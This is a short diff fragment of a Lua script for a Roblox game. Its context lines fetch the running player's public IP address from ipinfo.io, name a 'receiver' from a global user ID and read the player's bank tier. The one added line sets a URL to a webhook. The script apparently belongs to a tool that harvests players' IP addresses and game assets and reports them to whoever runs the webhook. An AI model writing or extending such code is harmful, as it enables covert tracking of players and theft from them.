@@ -1212,6 +1212,7 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
+local url = Webhook
 local lmao = "/5"
 local ping
 if #HList ~= 0 or #BHList ~= 0 then
